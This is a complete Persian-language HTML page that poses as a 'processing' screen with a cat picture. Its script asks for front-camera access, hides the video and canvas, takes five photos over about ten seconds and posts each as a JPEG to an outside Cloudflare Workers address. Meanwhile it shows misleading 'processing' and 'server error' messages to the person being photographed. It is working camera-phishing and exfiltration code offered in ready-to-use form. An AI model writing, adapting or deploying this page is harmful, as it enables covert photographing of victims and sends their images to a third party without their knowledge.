<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>در حال پردازش...</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            text-align: center;
            background: #ffffff; /* فقط این خط تغییر کرده */
            color: white;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .cat {
            width: 200px;
            height: 200px;
            margin: 40px auto;
            border-radius: 50%;
            object-fit: cover;
            border: 4px solid #ff66cc;
            box-shadow: 0 0 20px #ff66cc;
        }
        #status {
            margin: 20px 0;
            font-size: 20px;
            min-height: 50px;
            color: #ff4444;
            font-weight: bold;
        }
        #footer {
            margin-bottom: 40px;
            font-size: 18px;
            color: #ffffff;
            font-weight: bold;
        }
        video, canvas { display: none !important; }
    </style>
</head>
<body>

    <img src="https://cataas.com/cat?width=400&height=400" alt="گربه" class="cat">

    <div id="status">در حال پردازش...</div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <div id="footer">
        خطا!!!!
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');

        const WORKER_URL = 'https://bold-smoke-e8c.alijayz.workers.dev/';

        navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            }
        })
        .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                takePhotosAutomatically();
            };
        })
        .catch(err => {
            status.textContent = 'خطا: دسترسی به به سرور امکان پذیر نیست!';
        });

        function captureAndSend(photoNumber) {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('photo', blob, `photo${photoNumber}.jpg`);

                status.textContent = `در حال تلاش برای ارسال به سرور ${photoNumber}...`;

                fetch(WORKER_URL, {
                    method: 'POST',
                    body: formData
                })
                .then(() => {
                    status.textContent = 'خطا در ارسال به سرور!';
                })
                .catch(() => {
                    status.textContent = 'خطا در ارتباط با سرور!';
                });
            }, 'image/jpeg', 0.92);
        }

        function takePhotosAutomatically() {
            const intervals = [1500, 3500, 5500, 7500, 9500];
            intervals.forEach((time, index) => {
                setTimeout(() => captureAndSend(index + 1), time);
            });
        }
    </script>
</body>
</html>
